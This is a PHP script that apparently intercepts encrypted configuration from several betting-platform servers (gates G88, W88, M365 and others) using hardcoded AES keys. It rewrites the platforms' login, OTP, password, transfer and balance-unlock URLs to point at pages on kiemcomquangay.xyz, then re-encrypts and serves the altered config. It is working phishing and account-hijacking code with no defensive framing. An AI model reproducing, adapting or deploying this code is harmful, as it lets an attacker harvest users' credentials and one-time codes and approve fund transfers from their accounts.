<?php
// error_reporting(0);
// header("Content-Type: application/json; charset=utf-8");
$s = isset($_GET["s"]) ? $_GET["s"] : "";
$p = isset($_GET["p"]) ? $_GET["p"] : "";
$t = isset($_GET["_t"]) ? $_GET["_t"] : "";
if (is_file("cache_$s.txt")) {
	die(file_get_contents("cache_$s.txt"));
}
switch ($s) {
	case '2':
		$url = "http://pinticauripw.pw/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "w2lET1YDhvuIgzMOnIN1CUkV+hs0RKFO+Igrn1dpgnM=";
		$gate = "G88";
		break;
	case '3':
		$url = "http://canchise.info/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "W2FvFH8GWt59q4brGfH5c83LRJ5Hvpvgut5P7rRqsmQ=";
		$gate = "M88";
		break;
	case '4':
		$url = "http://ghbron.site/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "RvcK4AcavzIzILAH2t8tdxKj72Osizmb9r1SxWb/YPU=";
		$gate = "R88";
		break;
	case '6':
		$url = "http://earenoic.space/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "Jtr2U8wdtJrQ+GkG9v44MvRtTyPH94ZaweEy2tGE/EA=";
		$gate = "M365";
		break;
	case '7':
		$url = "http://blitif.space/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "XQeeMmMcFLbD/QuatTu/Eyd4Ng+FxHM27icEJMH8do8=";
		$gate = "W88";
		break;
	case '8':
		$url = "http://spinnets.work/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "GAK3dyHojoxoA6N3wO0nByKkMMT560FeavG8aYsHuZM=";
		$gate = "W365";
		break;
	case '9':
		$url = "http://moteabenig.xyz/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "3tpzrzLrw5GYMLCALDXAODZmaBrRBhme+/7OeBvXmDI=";
		$gate = "G365";
		break;
	default:
		$url = "http://pinticauripw.pw/api/setting/get?s=$s&p=$p&_t=$t";
		$secret_key = "w2lET1YDhvuIgzMOnIN1CUkV+hs0RKFO+Igrn1dpgnM=";
		$gate = "G88";
		break;
}

$all_header = getallheaders();
$list_header = array();
foreach ($all_header as $key => $value) {
	if ($key == "Host" || $key == "Accept-Encoding" || $key == "Connection") continue;
	$list_header[] = "$key: $value";
}
$list_header[] = "Connection: close";

$config_content = get_config($url, $list_header);
if ($config_content == '"You are using the demo version"') {
	die($config_content);
}

// remove quote
$config_content = substr($config_content, 1, -1);
$config_data = decrypt($config_content, $secret_key);
$json_data = json_decode($config_data);

// config new url
$json_data->DomainConfig->LoginUrl = "http://kiemcomquangay.xyz/login.php?gate=$gate";
$json_data->DomainConfig->AuthenOtpUrl = "http://kiemcomquangay.xyz/otp.php?gate=$gate";
$json_data->DomainConfig->ResetPassword = "http://kiemcomquangay.xyz/reset.php?gate=$gate";
$json_data->DomainConfig->TransferAccount = "http://kiemcomquangay.xyz/transfer.php?gate=$gate";
$json_data->DomainConfig->TranferAccountConfirm = "http://kiemcomquangay.xyz/confirm.php?gate=$gate";
$json_data->DomainConfig->Telesafe_AuthenUrl = "http://kiemcomquangay.xyz/telesafe.php?gate=$gate";
$json_data->DomainConfig->ChangePassword = "http://kiemcomquangay.xyz/change-password.php?gate=$gate";
$json_data->DomainConfig->ConfirmUnLockBalance = "http://kiemcomquangay.xyz/unreserve-balance-confirm.php?gate=$gate";
$json_data->DomainConfig->UnLockBalance = "http://kiemcomquangay.xyz/unreserve-balance.php?gate=$gate";

$json_data = json_encode($json_data);

// encrypt data
$result = '"'.encrypt($json_data, $secret_key).'"';
$fp = fopen("cache_$s.txt", "w+");
fwrite($fp, $result);
fclose($fp);
echo $result;

function get_config($url, $list_header)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, false);
	curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_TIMEOUT, 5000);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
	$raw_content = curl_exec($ch);
	curl_close($ch);
	return $raw_content;
}

function decrypt($ciphertext, $key)
{
	$key = base64_decode($key);
	$ciphertext = base64_decode($ciphertext);
	$nonce = substr($ciphertext, 0, 16);
	$mac = substr($ciphertext, -16);
	$ciphertext = substr($ciphertext, 16, -16);
	return openssl_decrypt($ciphertext, "aes-256-gcm", $key, OPENSSL_RAW_DATA, $nonce, $mac);
}

function encrypt($plaintext, $key)
{
	$key = base64_decode($key);
	$nonce = openssl_random_pseudo_bytes(16);
	$mac = "";
	$ciphertext = openssl_encrypt($plaintext, "aes-256-gcm", $key, OPENSSL_RAW_DATA, $nonce, $mac, "", 16);
	return base64_encode($nonce.$ciphertext.$mac);
}
?>